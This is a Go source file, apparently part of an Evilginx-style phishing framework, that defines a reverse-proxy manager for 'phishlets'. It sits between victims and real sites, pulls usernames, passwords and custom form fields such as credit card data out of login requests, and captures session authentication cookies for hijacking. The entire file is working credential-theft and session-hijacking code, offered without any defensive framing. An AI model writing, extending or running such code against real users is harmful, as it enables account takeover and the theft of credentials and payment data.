package evilginx

import (
	"fmt"
	"net/http"
	"net/http/httputil"
	"net/url"
	"strings"
)

// ProxyManager handles reverse proxy operations for phishing
type ProxyManager struct {
	phishlets map[string]*PhishletConfig
	sessions  *SessionManager
	proxies   map[string]*httputil.ReverseProxy
}

// NewProxyManager creates a new proxy manager
func NewProxyManager() *ProxyManager {
	return &ProxyManager{
		phishlets: make(map[string]*PhishletConfig),
		sessions:  NewSessionManager(),
		proxies:   make(map[string]*httputil.ReverseProxy),
	}
}

// RegisterPhishlet registers a phishlet configuration
func (pm *ProxyManager) RegisterPhishlet(phishlet *PhishletConfig) error {
	if phishlet.Name == "" {
		return fmt.Errorf("phishlet name cannot be empty")
	}

	pm.phishlets[phishlet.Name] = phishlet

	// Create reverse proxies for each proxy host
	for _, proxyHost := range phishlet.ProxyHosts {
		targetURL := fmt.Sprintf("https://%s.%s", proxyHost.OrigSub, proxyHost.Domain)
		target, err := url.Parse(targetURL)
		if err != nil {
			return fmt.Errorf("invalid target URL %s: %v", targetURL, err)
		}

		proxy := httputil.NewSingleHostReverseProxy(target)

		// Customize the director to modify requests
		originalDirector := proxy.Director
		proxy.Director = func(req *http.Request) {
			originalDirector(req)
			pm.modifyRequest(req, phishlet, &proxyHost)
		}

		// Customize response modifier
		proxy.ModifyResponse = func(resp *http.Response) error {
			return pm.modifyResponse(resp, phishlet, &proxyHost)
		}

		proxyKey := fmt.Sprintf("%s_%s", phishlet.Name, proxyHost.PhishSub)
		pm.proxies[proxyKey] = proxy
	}

	return nil
}

// GetProxy returns a reverse proxy for a specific phishlet and subdomain
func (pm *ProxyManager) GetProxy(phishletName, subdomain string) (*httputil.ReverseProxy, error) {
	proxyKey := fmt.Sprintf("%s_%s", phishletName, subdomain)
	proxy, exists := pm.proxies[proxyKey]
	if !exists {
		return nil, fmt.Errorf("proxy not found for %s", proxyKey)
	}
	return proxy, nil
}

// modifyRequest modifies outgoing requests to the target
func (pm *ProxyManager) modifyRequest(req *http.Request, phishlet *PhishletConfig, proxyHost *ProxyHost) {
	// Set proper host header
	req.Host = fmt.Sprintf("%s.%s", proxyHost.OrigSub, proxyHost.Domain)

	// Add custom headers
	req.Header.Set("X-Forwarded-Host", req.Host)

	// Extract and store credentials if this is a POST to login URL
	if req.Method == "POST" && strings.Contains(req.URL.Path, phishlet.LoginURL) {
		pm.captureCredentials(req, phishlet)
	}
}

// modifyResponse modifies responses from the target
func (pm *ProxyManager) modifyResponse(resp *http.Response, phishlet *PhishletConfig, proxyHost *ProxyHost) error {
	// Capture session cookies
	if proxyHost.Session {
		cookies := resp.Cookies()
		for _, cookie := range cookies {
			// Check if this is an auth token we're tracking
			for _, authToken := range phishlet.AuthTokens {
				for _, key := range authToken.Keys {
					if cookie.Name == key {
						// This is an auth token - store it
						pm.storeAuthToken(cookie, phishlet.Name)
					}
				}
			}
		}
	}

	return nil
}

// captureCredentials extracts credentials from POST request
func (pm *ProxyManager) captureCredentials(req *http.Request, phishlet *PhishletConfig) {
	// Parse form data
	err := req.ParseForm()
	if err != nil {
		return
	}

	session := &Session{
		PhishletName: phishlet.Name,
		IPAddress:    req.RemoteAddr,
		UserAgent:    req.UserAgent(),
		Valid:        true,
		Cookies:      make(map[string]string),
		Tokens:       make(map[string]string),
	}

	// Extract username
	if username := req.FormValue(phishlet.Credentials.Username.Key); username != "" {
		session.Username = username
	}

	// Extract password
	if password := req.FormValue(phishlet.Credentials.Password.Key); password != "" {
		session.Password = password
	}

	// Extract custom fields (e.g., credit card for Stripe)
	if len(phishlet.Credentials.Custom) > 0 {
		customData := make(map[string]string)
		for _, field := range phishlet.Credentials.Custom {
			if value := req.FormValue(field.Key); value != "" {
				customData[field.Key] = value
			}
		}
		// Store custom data in Tokens field for simplicity
		for k, v := range customData {
			session.Tokens[k] = v
		}
	}

	// Add session if we captured credentials
	if session.Username != "" || session.Password != "" {
		pm.sessions.AddSession(session)
	}
}

// storeAuthToken stores captured authentication tokens
func (pm *ProxyManager) storeAuthToken(cookie *http.Cookie, phishletName string) {
	// Find the most recent session for this phishlet
	sessions := pm.sessions.GetSessionsByPhishlet(phishletName)
	if len(sessions) > 0 {
		// Update the most recent session
		latestSession := sessions[len(sessions)-1]
		latestSession.Cookies[cookie.Name] = cookie.Value
	}
}

// GetSessionManager returns the session manager
func (pm *ProxyManager) GetSessionManager() *SessionManager {
	return pm.sessions
}

// GetPhishlet returns a phishlet configuration by name
func (pm *ProxyManager) GetPhishlet(name string) (*PhishletConfig, error) {
	phishlet, exists := pm.phishlets[name]
	if !exists {
		return nil, fmt.Errorf("phishlet not found: %s", name)
	}
	return phishlet, nil
}

// ListPhishlets returns all registered phishlets
func (pm *ProxyManager) ListPhishlets() []string {
	names := make([]string, 0, len(pm.phishlets))
	for name := range pm.phishlets {
		names = append(names, name)
	}
	return names
}
